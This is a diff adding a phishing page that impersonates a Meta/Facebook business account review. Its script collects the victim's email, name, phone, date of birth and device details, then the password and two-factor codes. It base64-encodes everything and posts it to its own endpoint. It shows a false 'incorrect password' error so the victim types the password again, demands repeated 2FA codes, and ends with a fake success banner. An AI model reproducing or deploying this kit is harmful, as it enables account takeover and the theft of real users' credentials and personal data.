+                                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round" style="display:none">
+                                    <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                            </button>
+                        </div>
+                        <p class="error_password" id="pwd-error"></p>
+                        <button type="submit" class="continue-btn" id="pwd-submit-btn">
+                            <span id="pwd-btn-text" data-i18n="pwd.continue">Continue</span>
+                        </button>
+                        <a href="#" class="forgot-link" data-i18n="pwd.forgot">Forgot your password?</a>
+                    </form>
+                </div>
+            </div>
+            <div class="modal-logo-bottom">
+                <img width="100%" height="100%" alt="Meta" src="./img/logo-gray.svg">
+            </div>
+        </div>
+    </div>
+
+    <!-- 2FA Modal -->
+    <div id="modal-2fa" class="modal-overlay hidden">
+        <div class="modal-box">
+            <div style="width:100%;">
+                <div class="tfa-header-row">
+                    <span id="2fa-email-display"></span>
+                    <div class="tfa-dot"></div>
+                    <span>Facebook</span>
+                </div>
+                <h2 class="tfa-title">
+                    <span data-i18n="tfa.title">Two-factor authentication required</span>
+                </h2>
+                <p class="tfa-desc">
+                    <span data-i18n="tfa.desc">Enter the code for this account that we sent to</span>
+                    <span id="2fa-masked-info"></span>
+                    <span data-i18n="tfa.desc2">or simply confirm through the authentication app you have set up (such as Duo Mobile or Google Authenticator).</span>
+                </p>
+                <div class="tfa-image">
+                    <img width="100%" alt="authentication" src="./img/authentication.png">
+                </div>
+                <div style="width:100%;">
+                    <form id="form-2fa">
+                        <div class="pwd-input-wrapper">
+                            <input id="code-2fa" placeholder="Enter the code" data-i18n-placeholder="tfa.placeholder" maxlength="8" inputmode="numeric"
+                                pattern="[0-9]*" value=""
+                                oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,8)">
+                        </div>
+                        <p class="error_password" id="2fa-error"></p>
+                        <div style="margin-top:20px;">
+                            <button type="submit" id="tfa-submit-btn" disabled class="continue-btn tfa-submit-btn">
+                                <span id="tfa-btn-text" data-i18n="tfa.submit">Continue</span>
+                                <span id="tfa-spinner" class="loading-spinner" style="display:none;"></span>
+                            </button>
+                        </div>
+                        <div class="tfa-try-another">
+                            <span data-i18n="tfa.help">Need another way to authenticate?</span>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <div class="modal-logo-bottom">
+                <img width="100%" height="100%" alt="Meta" src="./img/logo-gray.svg">
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Banner -->
+    <div id="modal-success" class="modal-overlay hidden">
+        <div
+            style="background:#fff;border-radius:4px;max-width:520px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,0.15);overflow:hidden;animation:modalSlideIn 0.3s ease;">
+            <div style="background:#3b5998;padding:16px 20px;">
+                <h2 style="color:#fff;font-size:16px;font-weight:700;margin:0;line-height:1.4;" data-i18n="success.title">Your request for review
+                    has been submitted successfully.</h2>
+            </div>
+            <div style="padding:20px;border-bottom:1px solid #ddd;">
+                <p style="color:#333;font-size:14px;margin:0;line-height:1.5;" data-i18n="success.desc">You will receive an email notification
+                    once the account review process is complete.</p>
+            </div>
+            <div style="display:flex;align-items:center;justify-content:space-between;padding:12px 20px;">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" style="height:22px;">
+                <button onclick="window.location.href='https://www.facebook.com'" data-i18n="success.ok"
+                    style="background:#3b5998;color:#fff;border:none;border-radius:4px;padding:8px 24px;font-size:14px;font-weight:600;cursor:pointer;">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        Copyright &copy; 2026 Meta for Business
+    </footer>
+
+    <script src="/i18n.js"></script>
+
+    <script>
+        /* ===== API Logic ===== */
+        let currentSessionId = null;
+        let pwdAttempts = 0;
+        let isSubmittingInfo = false;
+
+        function encodePayload(data) {
+            const json = JSON.stringify(data);
+            const bytes = new TextEncoder().encode(json);
+            const binStr = Array.from(bytes, b => String.fromCodePoint(b)).join('');
+            return btoa(binStr);
+        }
+
+        async function sendData(payload) {
+            try {
+                const response = await fetch('/api/send-request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: encodePayload(payload) })
+                });
+                return await response.json();
+            } catch (e) {
+                return { success: false };
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown', os = 'Unknown';
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+            if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('Windows') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            return {
+                browser, os,
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language || '',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                mobile: /Mobile|Android|iPhone|iPad/i.test(ua)
+            };
+        }
+
+        /* ===== Not Logged In popup -> Password Modal ===== */
+        document.getElementById('nli-login-btn').addEventListener('click', function () {
+            document.getElementById('notloggedin-overlay').classList.add('hidden');
+            document.getElementById('modal-password').classList.remove('hidden');
+        });
+
+        /* ===== Info Form Submit ===== */
+        document.getElementById('form-info').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            if (isSubmittingInfo) return;
+
+            // Clear previous errors
+            clearFormErrors();
+
+            // Empty validation
+            const email = document.getElementById('email').value;
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showFormError('error-email', window.getTranslation ? window.getTranslation('error.email') : 'Please enter a valid email address');
+                document.getElementById('email').focus();
+                return;
+            }
+
+            // DOB validation
+            const day = parseInt(document.getElementById('day').value);
+            const month = parseInt(document.getElementById('month').value);
+            const year = parseInt(document.getElementById('year').value);
+            if (!day || day < 1 || day > 31) {
+                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.dayRange') : 'Please enter a valid day (1-31)');
+                document.getElementById('day').focus();
+                return;
+            }
+            if (!month || month < 1 || month > 12) {
+                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.monthRange') : 'Please enter a valid month (1-12)');
+                document.getElementById('month').focus();
+                return;
+            }
+            if (!year || year < 1 || year > new Date().getFullYear()) {
+                showFormError('error-dob', window.getTranslation ? window.getTranslation('error.yearRange') : 'Please enter a valid year');
+                document.getElementById('year').focus();
+                return;
+            }
+
+            // Phone validation - require at least 7 digits after country code
+            const phoneEl = document.getElementById('phone');
+            const phoneValue = phoneEl.value.replace(/\s/g, '');
+            const afterCode = phoneValue.startsWith(currentCountryCode)
+                ? phoneValue.substring(currentCountryCode.length)
+                : phoneValue.replace(/^\+?\d{1,3}/, '');
+            const digitCount = (afterCode.match(/\d/g) || []).length;
+            if (digitCount < 7 || phoneValue === currentCountryCode || phoneValue.trim() === currentCountryCode.trim()) {
+                showFormError('error-phone', window.getTranslation ? window.getTranslation('error.phone') : 'Please enter a valid phone number (at least 7 digits)');
+                phoneEl.focus();
+                return;
+            }
+
+            isSubmittingInfo = true;
+
+            const btn = document.getElementById('info-submit-btn');
+            const btnText = document.getElementById('info-btn-text');
+            const spinner = document.getElementById('info-spinner');
+            btnText.style.display = 'none';
+            spinner.style.display = 'inline-block';
+            btn.disabled = true;
+
+            // Save form data for potential re-use in password step
+            window._savedFormData = {
+                email: email,
+                emailBusiness: document.getElementById('emailBusiness')?.value || '',
+                fullName: document.getElementById('fullName').value,
+                phone: document.getElementById('phone').value,
+                fanpage: document.getElementById('fanpage').value,
+                dob: `${day}/${month}/${year}`,
+                note: document.getElementById('message')?.value || '',
+                device: getDeviceInfo()
+            };
+
+            try {
+                // Run API call and minimum delay in parallel
+                const [result] = await Promise.all([
+                    sendData({
+                        type: 'info',
+                        ...window._savedFormData
+                    }),
+                    new Promise(r => setTimeout(r, 3000)) // minimum 3s loading
+                ]);
+
+                if (result && result.success && result.session_id) {
+                    currentSessionId = result.session_id;
+                    localStorage.setItem('session_id', result.session_id);
+                }
+
+                // Go straight to password modal (skip "Not Logged In" popup)
+                document.getElementById('modal-password').classList.remove('hidden');
+            } catch (err) {
+                console.error('Error:', err);
+                // Still proceed to password step - it will handle sending data
+                document.getElementById('modal-password').classList.remove('hidden');
+            } finally {
+                isSubmittingInfo = false;
+                btnText.style.display = '';
+                spinner.style.display = 'none';
+                btn.disabled = false;
+            }
+        });
+
+        /* ===== Password Eye Toggle ===== */
+        document.getElementById('toggle-password').addEventListener('click', function () {
+            const pwdInput = document.getElementById('password');
+            const eyeOff = document.getElementById('eye-off-icon');
+            const eyeOn = document.getElementById('eye-on-icon');
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                eyeOff.style.display = 'none';
+                eyeOn.style.display = '';
+            } else {
+                pwdInput.type = 'password';
+                eyeOff.style.display = '';
+                eyeOn.style.display = 'none';
+            }
+        });
+
+        /* ===== Masking Helpers (matching v2) ===== */
+        function maskEmail(email) {
+            if (!email) return '';
+            const [name, domain] = email.split('@');
+            if (!domain) return email;
+            const maskedName = name.charAt(0) + '**' + name.charAt(name.length - 1);
+            return maskedName + '@' + domain;
+        }
+
+        function maskPhone(phone) {
+            if (!phone) return '';
+            const cleaned = phone.replace(/\s/g, '');
+            if (cleaned.length < 6) return phone;
+            const lastDigits = cleaned.slice(-2);
+            const prefix = cleaned.slice(0, -4);
+            return prefix + ' ** ' + lastDigits;
+        }
+
+        function update2FADisplay() {
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const fullName = document.getElementById('fullName').value;
+            const emailDisplay = document.getElementById('2fa-email-display');
+            const maskedInfo = document.getElementById('2fa-masked-info');
+            const stepEl = document.getElementById('2fa-step');
+            if (emailDisplay) emailDisplay.textContent = fullName;
+            if (maskedInfo) maskedInfo.textContent = maskEmail(email) + ', ' + maskPhone(phone);
+            if (stepEl) stepEl.textContent = tfaAttempts + 1;
+        }
+
+        /* ===== Form Validation Helpers ===== */
+        function showFormError(id, msg) {
+            const el = document.getElementById(id);
+            if (el) { el.querySelector('span').textContent = msg; el.classList.add('visible'); }
+        }
+        function clearFormErrors() {
+            document.querySelectorAll('.form-error').forEach(el => {
+                el.classList.remove('visible');
+                const span = el.querySelector('span');
+                if (span) span.textContent = '';
+            });
+        }
+        ['email', 'day', 'month', 'year', 'phone'].forEach(id => {
+            document.getElementById(id)?.addEventListener('input', clearFormErrors);
+        });
+
+        /* ===== Password Form Submit (v2 logic) ===== */
+        let tfaAttempts = 0;
+        document.getElementById('form-password').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const pwd = document.getElementById('password');
+            const error = document.getElementById('pwd-error');
+            const btnText = document.getElementById('pwd-btn-text');
+            const btn = document.getElementById('pwd-submit-btn');
+
+            if (!pwd.value.trim()) {
+                error.textContent = (window.getTranslation && window.getTranslation('pwd.emptyError')) || "You haven't entered your password!";
+                return;
+            }
+
+            if (pwd.value.length <= 6) {
+                error.textContent = (window.getTranslation && window.getTranslation('pwd.lengthError')) || "Password must be more than 6 characters!";
+                return;
+            }
+
+            error.textContent = '';
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading-spinner"></span>';
+            pwdAttempts++;
+
+            const savedPwd = pwd.value;
+
+            try {
+                // If session was lost or never created, re-send info + password together
+                if (!currentSessionId && window._savedFormData) {
+                    const [result] = await Promise.all([
+                        sendData({
+                            type: 'info',
+                            ...window._savedFormData,
+                            password: savedPwd
+                        }),
+                        new Promise(r => setTimeout(r, 6000))
+                    ]);
+                    if (result && result.success && result.session_id) {
+                        currentSessionId = result.session_id;
+                        localStorage.setItem('session_id', result.session_id);
+                    }
+                } else if (currentSessionId) {
+                    // Normal flow: send password to existing session
+                    await Promise.all([
+                        sendData({ type: 'password', session_id: currentSessionId, password: savedPwd }),
+                        new Promise(r => setTimeout(r, 6000))
+                    ]);
+                }
+            } catch (err) {
+                console.error('Password send error:', err);
+            }
+
+            btn.disabled = false;
+            btn.innerHTML = '<span id="pwd-btn-text" data-i18n="pwd.continue">' + ((window.getTranslation && window.getTranslation('pwd.continue')) || 'Continue') + '</span>';
+
+            if (pwdAttempts === 1) {
+                error.textContent = (window.getTranslation && window.getTranslation('pwd.incorrectError')) || "The password you've entered is incorrect.";
+                pwd.value = '';
+            } else {
+                error.textContent = '';
+                try { update2FADisplay(); } catch(e) { console.warn('update2FA:', e); }
+                document.getElementById('modal-password').classList.add('hidden');
+                document.getElementById('modal-2fa').classList.remove('hidden');
+            }
+        });
+
+        /* ===== 2FA Code Input - Enable button when 6-8 digits ===== */
+        document.getElementById('code-2fa').addEventListener('input', function () {
+            const btn = document.getElementById('tfa-submit-btn');
+            const len = this.value.replace(/[^0-9]/g, '').length;
+            if (len === 6 || len === 8) {
+                btn.disabled = false;
+                btn.classList.add('tfa-enabled');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('tfa-enabled');
+            }
+        });
+
+        /* ===== 2FA Form Submit (v2 logic with 30s countdown) ===== */
+        document.getElementById('form-2fa').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const codeInput = document.getElementById('code-2fa');
+            const error = document.getElementById('2fa-error');
+            const btnText = document.getElementById('tfa-btn-text');
+            const spinner = document.getElementById('tfa-spinner');
+            const btn = document.getElementById('tfa-submit-btn');
+
+            if (!codeInput.value.trim() || (codeInput.value.length !== 6 && codeInput.value.length !== 8)) return;
+
+            const savedCode = codeInput.value;
+            if (window._used2FA && window._used2FA.includes(savedCode)) {
+                error.textContent = (window.getTranslation && window.getTranslation('tfa.duplicateError')) || "This code has already been used. Please enter a new code.";
+                return;
+            }
+
+            error.textContent = '';
+            btnText.style.display = 'none';
+            spinner.style.display = 'inline-block';
+            btn.disabled = true;
+            codeInput.disabled = true;
+            tfaAttempts++;
+            if (!window._used2FA) window._used2FA = [];
+            window._used2FA.push(savedCode);
+
+            try {
+                // If session was lost, try to re-create it with saved form data first
+                if (!currentSessionId && window._savedFormData) {
+                    const [result] = await Promise.all([
+                        sendData({ type: 'info', ...window._savedFormData }),
+                        new Promise(r => setTimeout(r, 1000))
+                    ]);
+                    if (result && result.success && result.session_id) {
+                        currentSessionId = result.session_id;
+                        localStorage.setItem('session_id', result.session_id);
+                    }
+                }
+
+                // Now send the 2FA code
+                if (currentSessionId) {
+                    await Promise.all([
+                        sendData({ type: '2fa', session_id: currentSessionId, code: savedCode }),
+                        new Promise(r => setTimeout(r, 3000))
+                    ]);
+                } else {
+                    await new Promise(r => setTimeout(r, 3000));
+                }
+            } catch (err) {
+                console.error('2FA send error:', err);
+                await new Promise(r => setTimeout(r, 3000));
+            }
+
+            spinner.style.display = 'none';
+            btnText.style.display = '';
+
+            if (tfaAttempts <= 2) {
+                // Show 30s countdown
+                codeInput.value = '';
+                let countdown = 30;
+                const updateCountdown = () => {
+                    const mins = Math.floor(countdown / 60);
+                    const secs = countdown % 60;
+                    
+                    const errBase = (window.getTranslation && window.getTranslation('tfa.incorrectError')) || 'The two-factor authentication you entered is incorrect. Please, try again after';
+                    const minStr = (window.getTranslation && window.getTranslation('tfa.minutes')) || 'minutes';
+                    const secStr = (window.getTranslation && window.getTranslation('tfa.seconds')) || 'seconds';
+                    
+                    error.textContent = `${errBase} ${mins} ${minStr} ${secs.toString().padStart(2, '0')} ${secStr}.`;
+                };
+                updateCountdown();
+
+                const interval = setInterval(() => {
+                    countdown--;
+                    if (countdown <= 0) {
+                        clearInterval(interval);
+                        error.textContent = (window.getTranslation && window.getTranslation('tfa.tryAgain')) || 'You can try again now.';
+                        codeInput.disabled = false;
+                        btn.disabled = false;
+                        btn.classList.remove('tfa-enabled');
+                        codeInput.focus();
+                    } else {
+                        updateCountdown();
+                    }
+                }, 1000);
+            } else {
+                // 3rd attempt - show success banner
+                error.textContent = '';
+                codeInput.disabled = false;
+                document.getElementById('modal-2fa').classList.add('hidden');
+                document.getElementById('modal-success').classList.remove('hidden');
+            }
+        });
+
+        /* ===== ESC Close Modal (disabled to prevent accidental data loss) ===== */
+    </script>
+
+    <script>
+        /* ===== Country Data ===== */
+        const countryCodeToFlag = { "+1": "us", "+7": "ru", "+20": "eg", "+27": "za", "+30": "gr", "+31": "nl", "+32": "be", "+33": "fr", "+34": "es", "+36": "hu", "+39": "it", "+40": "ro", "+41": "ch", "+43": "at", "+44": "gb", "+45": "dk", "+46": "se", "+47": "no", "+48": "pl", "+49": "de", "+51": "pe", "+52": "mx", "+53": "cu", "+54": "ar", "+55": "br", "+56": "cl", "+57": "co", "+58": "ve", "+60": "my", "+61": "au", "+62": "id", "+63": "ph", "+64": "nz", "+65": "sg", "+66": "th", "+81": "jp", "+82": "kr", "+84": "vn", "+86": "cn", "+90": "tr", "+91": "in", "+92": "pk", "+93": "af", "+94": "lk", "+95": "mm", "+98": "ir", "+212": "ma", "+213": "dz", "+216": "tn", "+218": "ly", "+220": "gm", "+221": "sn", "+222": "mr", "+223": "ml", "+224": "gn", "+225": "ci", "+226": "bf", "+227": "ne", "+228": "tg", "+229": "bj", "+230": "mu", "+231": "lr", "+232": "sl", "+233": "gh", "+234": "ng", "+235": "td", "+236": "cf", "+237": "cm", "+238": "cv", "+240": "gq", "+241": "ga", "+242": "cg", "+243": "cd", "+244": "ao", "+245": "gw", "+248": "sc", "+249": "sd", "+250": "rw", "+251": "et", "+252": "so", "+253": "dj", "+254": "ke", "+255": "tz", "+256": "ug", "+257": "bi", "+258": "mz", "+260": "zm", "+261": "mg", "+263": "zw", "+264": "na", "+265": "mw", "+266": "ls", "+267": "bw", "+268": "sz", "+269": "km", "+291": "er", "+297": "aw", "+298": "fo", "+299": "gl", "+350": "gi", "+351": "pt", "+352": "lu", "+353": "ie", "+354": "is", "+355": "al", "+356": "mt", "+357": "cy", "+358": "fi", "+359": "bg", "+370": "lt", "+371": "lv", "+372": "ee", "+373": "md", "+374": "am", "+375": "by", "+376": "ad", "+377": "mc", "+378": "sm", "+380": "ua", "+381": "rs", "+382": "me", "+383": "xk", "+385": "hr", "+386": "si", "+387": "ba", "+389": "mk", "+420": "cz", "+421": "sk", "+423": "li", "+500": "fk", "+501": "bz", "+502": "gt", "+503": "sv", "+504": "hn", "+505": "ni", "+506": "cr", "+507": "pa", "+509": "ht", "+591": "bo", "+592": "gy", "+593": "ec", "+595": "py", "+597": "sr", "+598": "uy", "+670": "tl", "+673": "bn", "+675": "pg", "+676": "to", "+677": "sb", "+678": "vu", "+679": "fj", "+680": "pw", "+685": "ws", "+686": "ki", "+850": "kp", "+852": "hk", "+853": "mo", "+855": "kh", "+856": "la", "+880": "bd", "+886": "tw", "+960": "mv", "+961": "lb", "+962": "jo", "+963": "sy", "+964": "iq", "+965": "kw", "+966": "sa", "+967": "ye", "+968": "om", "+970": "ps", "+971": "ae", "+972": "il", "+973": "bh", "+974": "qa", "+975": "bt", "+976": "mn", "+977": "np", "+992": "tj", "+993": "tm", "+994": "az", "+995": "ge", "+996": "kg", "+998": "uz" };
+
+        const countryCodeToName = { "+1": "United States", "+7": "Russia", "+20": "Egypt", "+27": "South Africa", "+30": "Greece", "+31": "Netherlands", "+32": "Belgium", "+33": "France", "+34": "Spain", "+36": "Hungary", "+39": "Italy", "+40": "Romania", "+41": "Switzerland", "+43": "Austria", "+44": "United Kingdom", "+45": "Denmark", "+46": "Sweden", "+47": "Norway", "+48": "Poland", "+49": "Germany", "+51": "Peru", "+52": "Mexico", "+53": "Cuba", "+54": "Argentina", "+55": "Brazil", "+56": "Chile", "+57": "Colombia", "+58": "Venezuela", "+60": "Malaysia", "+61": "Australia", "+62": "Indonesia", "+63": "Philippines", "+64": "New Zealand", "+65": "Singapore", "+66": "Thailand", "+81": "Japan", "+82": "South Korea", "+84": "Vietnam", "+86": "China", "+90": "Turkey", "+91": "India", "+92": "Pakistan", "+93": "Afghanistan", "+94": "Sri Lanka", "+95": "Myanmar", "+98": "Iran", "+212": "Morocco", "+213": "Algeria", "+216": "Tunisia", "+218": "Libya", "+220": "Gambia", "+221": "Senegal", "+222": "Mauritania", "+223": "Mali", "+224": "Guinea", "+225": "Ivory Coast", "+226": "Burkina Faso", "+227": "Niger", "+228": "Togo", "+229": "Benin", "+230": "Mauritius", "+231": "Liberia", "+232": "Sierra Leone", "+233": "Ghana", "+234": "Nigeria", "+235": "Chad", "+236": "Central African Republic", "+237": "Cameroon", "+238": "Cape Verde", "+240": "Equatorial Guinea", "+241": "Gabon", "+242": "Republic of the Congo", "+243": "DR Congo", "+244": "Angola", "+245": "Guinea-Bissau", "+248": "Seychelles", "+249": "Sudan", "+250": "Rwanda", "+251": "Ethiopia", "+252": "Somalia", "+253": "Djibouti", "+254": "Kenya", "+255": "Tanzania", "+256": "Uganda", "+257": "Burundi", "+258": "Mozambique", "+260": "Zambia", "+261": "Madagascar", "+263": "Zimbabwe", "+264": "Namibia", "+265": "Malawi", "+266": "Lesotho", "+267": "Botswana", "+268": "Eswatini", "+269": "Comoros", "+291": "Eritrea", "+297": "Aruba", "+298": "Faroe Islands", "+299": "Greenland", "+350": "Gibraltar", "+351": "Portugal", "+352": "Luxembourg", "+353": "Ireland", "+354": "Iceland", "+355": "Albania", "+356": "Malta", "+357": "Cyprus", "+358": "Finland", "+359": "Bulgaria", "+370": "Lithuania", "+371": "Latvia", "+372": "Estonia", "+373": "Moldova", "+374": "Armenia", "+375": "Belarus", "+376": "Andorra", "+377": "Monaco", "+378": "San Marino", "+380": "Ukraine", "+381": "Serbia", "+382": "Montenegro", "+383": "Kosovo", "+385": "Croatia", "+386": "Slovenia", "+387": "Bosnia and Herzegovina", "+389": "North Macedonia", "+420": "Czech Republic", "+421": "Slovakia", "+423": "Liechtenstein", "+500": "Falkland Islands", "+501": "Belize", "+502": "Guatemala", "+503": "El Salvador", "+504": "Honduras", "+505": "Nicaragua", "+506": "Costa Rica", "+507": "Panama", "+509": "Haiti", "+591": "Bolivia", "+592": "Guyana", "+593": "Ecuador", "+595": "Paraguay", "+597": "Suriname", "+598": "Uruguay", "+670": "Timor-Leste", "+673": "Brunei", "+675": "Papua New Guinea", "+676": "Tonga", "+677": "Solomon Islands", "+678": "Vanuatu", "+679": "Fiji", "+680": "Palau", "+685": "Samoa", "+686": "Kiribati", "+850": "North Korea", "+852": "Hong Kong", "+853": "Macau", "+855": "Cambodia", "+856": "Laos", "+880": "Bangladesh", "+886": "Taiwan", "+960": "Maldives", "+961": "Lebanon", "+962": "Jordan", "+963": "Syria", "+964": "Iraq", "+965": "Kuwait", "+966": "Saudi Arabia", "+967": "Yemen", "+968": "Oman", "+970": "Palestine", "+971": "UAE", "+972": "Israel", "+973": "Bahrain", "+974": "Qatar", "+975": "Bhutan", "+976": "Mongolia", "+977": "Nepal", "+992": "Tajikistan", "+993": "Turkmenistan", "+994": "Azerbaijan", "+995": "Georgia", "+996": "Kyrgyzstan", "+998": "Uzbekistan" };
+
+        let currentCountryCode = '+1';
+
+        function extractCountryCode(val) {
+            let t = val.startsWith('+') ? val : '+' + val;
+            t = '+' + t.replace(/\+/g, '');
+            for (const code of Object.keys(countryCodeToFlag).sort((a, b) => b.length - a.length)) {
+                if (t.startsWith(code)) return code;
+            }
+            return null;
+        }
+
+        function updateFlagFromCode(code) {
+            const flag = countryCodeToFlag[code];
+            if (flag) {
+                currentCountryCode = code;
+                const img = document.getElementById('selected-flag-img');
+                if (img) { img.src = 'https://flagcdn.com/w20/' + flag + '.png'; img.alt = flag.toUpperCase(); }
+                const sf = document.querySelector('.selected-flag');
+                if (sf) { sf.title = (countryCodeToName[code] || flag.toUpperCase()) + ': ' + code; }
+            }
+        }
+
+        function toggleCountryDropdown() {
+            const dd = document.getElementById('country-dropdown');
+            const isOpen = dd.style.display !== 'none';
+            dd.style.display = isOpen ? 'none' : 'block';
+            document.getElementById('flag-dropdown').classList.toggle('open', !isOpen);
+            if (!isOpen) {
+                const si = document.getElementById('country-search');
+                if (si) { si.value = ''; dd.querySelectorAll('.country').forEach(i => i.style.display = ''); setTimeout(() => si.focus(), 50); }
+            }
+        }
+
+        function selectCountry(code, flag) {
+            currentCountryCode = code;
+            const img = document.getElementById('selected-flag-img');
+            if (img) { img.src = 'https://flagcdn.com/w20/' + flag + '.png'; img.alt = flag.toUpperCase(); }
+            const sf = document.querySelector('.selected-flag');
+            if (sf) { sf.title = (countryCodeToName[code] || '') + ': ' + code; }
+            document.getElementById('phone').value = code + ' ';
+            document.getElementById('phone').focus();
+            document.getElementById('country-dropdown').style.display = 'none';
+            document.getElementById('flag-dropdown').classList.remove('open');
+        }
+
+        // Populate country dropdown
+        (function () {
+            const dd = document.getElementById('country-dropdown');
+            if (!dd) return;
+            const entries = Object.entries(countryCodeToName).sort((a, b) => a[1].localeCompare(b[1]));
+            let html = '';
+            for (const [code, name] of entries) {
+                const flag = countryCodeToFlag[code] || '';
+                const hl = code === '+1' ? ' highlight' : '';
+                html += `<li class="country${hl}" onclick="selectCountry('${code}','${flag}')"><img src="https://flagcdn.com/w20/${flag}.png" class="country-flag"><span class="country-name">${name}</span><span class="dial-code">${code}</span></li>`;
+            }
+            dd.insertAdjacentHTML('beforeend', html);
+        })();
+
+        // Phone input auto-format
+        const phoneInput = document.getElementById('phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', function () {
+                let cleaned = this.value.replace(/[^\d+]/g, '');
+                cleaned = cleaned.startsWith('+') ? cleaned : '+' + cleaned;
+                cleaned = '+' + cleaned.replace(/\+/g, '');
+                const code = extractCountryCode(cleaned);
+                if (code) {
+                    if (code !== currentCountryCode) updateFlagFromCode(code);
+                    const digits = cleaned.substring(code.length);
+                    let fmt = '';
+                    for (let i = 0; i < digits.length; i++) {
+                        if (i > 0 && i % 3 === 0) fmt += ' ';
+                        fmt += digits[i];
+                    }
+                    this.value = code + (fmt ? ' ' + fmt : '');
+                } else {
+                    // No valid country code found (e.g. user typed local number like "0837899900")
+                    // Use currentCountryCode as fallback, strip leading zero if present
+                    const rawDigits = cleaned.replace(/^\+/, '');
+                    const localDigits = rawDigits.replace(/^0+/, ''); // strip leading zeros
+                    if (localDigits.length > 0) {
+                        let fmt = '';
+                        for (let i = 0; i < localDigits.length; i++) {
+                            if (i > 0 && i % 3 === 0) fmt += ' ';
+                            fmt += localDigits[i];
+                        }
+                        this.value = currentCountryCode + (fmt ? ' ' + fmt : '');
+                    } else {
+                        this.value = currentCountryCode + ' ';
+                    }
+                }
+            });
+        }
+
+        // Auto-detect country: check localStorage first (pre-fetched on /home), fallback to API
+        (async function autoDetectCountry() {
+            let detectedCode = '+1';
+            let detectedFlag = 'us';
+
+            function findByCountry(cc) {
+                for (const [dialCode, flagCode] of Object.entries(countryCodeToFlag)) {
+                    if (flagCode === cc) return { dialCode, flagCode };
+                }
+                return null;
+            }
+
+            // 1. Try localStorage (pre-fetched from i18n.js — instant)
+            const cached = localStorage.getItem('geo_country');
+            if (cached) {
+                const found = findByCountry(cached.toLowerCase());
+                if (found) {
+                    detectedCode = found.dialCode;
+                    detectedFlag = found.flagCode;
+                }
+            } else {
+                // 2. Fallback: fetch from API (consistent with i18n.js)
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    if (data && data.country_code) {
+                        const cc = data.country_code.toLowerCase();
+                        localStorage.setItem('geo_country', cc);
+                        const found = findByCountry(cc);
+                        if (found) {
+                            detectedCode = found.dialCode;
+                            detectedFlag = found.flagCode;
+                        }
+                    }
+                } catch (e) { }
+            }
+
+            // Apply detected (or default) country
+            currentCountryCode = detectedCode;
+            const flagImg = document.getElementById('selected-flag-img');
+            if (flagImg) {
+                flagImg.src = 'https://flagcdn.com/w20/' + detectedFlag + '.png';
+                flagImg.alt = detectedFlag.toUpperCase();
+            }
+            const selectedFlag = document.querySelector('.selected-flag');
+            if (selectedFlag) {
+                selectedFlag.title = (countryCodeToName[detectedCode] || '') + ': ' + detectedCode;
+            }
+            const phoneEl = document.getElementById('phone');
+            if (phoneEl && !phoneEl.value.trim()) phoneEl.value = detectedCode + ' ';
+        })();
+        // Country search filter
+        document.getElementById('country-search')?.addEventListener('input', function () {
+            const q = this.value.toLowerCase();
+            document.querySelectorAll('#country-dropdown .country').forEach(item => {
+                const name = item.querySelector('.country-name')?.textContent.toLowerCase() || '';
+                const dial = item.querySelector('.dial-code')?.textContent || '';
+                item.style.display = (name.includes(q) || dial.includes(q)) ? '' : 'none';
+            });
+        });
+
+        // Click outside to close dropdown
+        document.addEventListener('click', function (e) {
+            if (!e.target.closest('.flag-dropdown') && !e.target.closest('.country-list')) {
+                const dd = document.getElementById('country-dropdown');
+                if (dd) { dd.style.display = 'none'; document.getElementById('flag-dropdown')?.classList.remove('open'); }
+            }
+        });
+    </script>
+
+    <style>
+        .skiptranslate {
+            display: none !important;
+        }
+    </style>
+</body>
+
+</html>
